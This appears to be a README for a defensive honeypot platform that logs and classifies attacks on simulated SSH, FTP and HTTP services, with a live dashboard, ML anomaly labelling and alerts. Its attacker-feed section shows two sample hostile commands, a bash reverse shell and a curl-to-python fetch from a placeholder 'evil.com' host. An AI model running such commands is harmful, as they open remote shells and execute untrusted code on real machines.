## 🚨 Honeypot-as-a-Service (HaaS): Real-Time Cyber Threat Detection & Defense Platform

### 🔍 Overview:

Our project is a **Honeypot-as-a-Service** platform that **detects, logs, analyzes, visualizes, and classifies real-time cyber attacks** using simulated honeypot services. It's enhanced with **machine learning**, **automated IP blocking**, and a live **real-time dashboard** for security teams to monitor and respond instantly.

> “What antivirus does after a breach, our system does proactively before damage is done.”

### 💡 Core Features:

#### 1. 🛡️ **Simulated Honeypot Services**

* Simulates vulnerable SSH, FTP, HTTP ports to **bait attackers**.
* Logs every command and connection attempt.
* Feels like a real service—deceives attackers into interacting.

#### 2. ⚡ **Real-Time Interactive Dashboard**

* Built in HTML + Chart.js + PHP + MySQL (No frameworks).
* Live updates every **5 seconds** with:

  * 📌 **Attack Type Distribution** (Normal vs Suspicious)
  * ⏱️ **Time Series Graph** (Attacks over the last 12 hours)
  * 🔐 **SSH Login Classifier** (Success/Fail attempts)
  * 🚨 **Top IP Scanners** (from PSAD)
  * 📊 **PSAD Summary Metrics** (Blocked IPs, Total Sources)
  * 🛠️ **Port Scan Activity** (Tooltips with timestamp)

#### 3. 🧠 **ML-based Anomaly Detection**

* Every login attempt is classified using an AI model:

  * `Normal` or `Suspicious`
* Judges or admins can review and correct labels.
* Model **re-trains automatically** based on human feedback (active learning).

#### 4. 🔁 **Review & Feedback System**

* Admin panel for:

  * Reviewing unverified login logs.
  * Labeling them with one click (`Normal` / `Suspicious`).
  * System learns from admin input for smarter future classifications.

#### 5. 📡 **Real SSH Monitoring (Non-standard port)**

* Monitors actual login attempts on a real SSH server (e.g., port 2222).
* Logs are parsed and stored into MySQL in real time.


#### 8. 🧑‍💻 **Attacker Activity Feed**

* Table of all commands executed by attackers.
* Shows live logs such as:

  ```bash
  bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
  curl http://evil.com/backdoor.py | python3
  ```

#### 9. 📧 **Gmail Alerts**

* Auto sends email to admin on:

  * Port scan detection

#### 10. 📈 **Fully Auto-Refreshing Interface**

* No manual refresh needed.
* Everything updates seamlessly via fetch + JSON every 5 seconds.
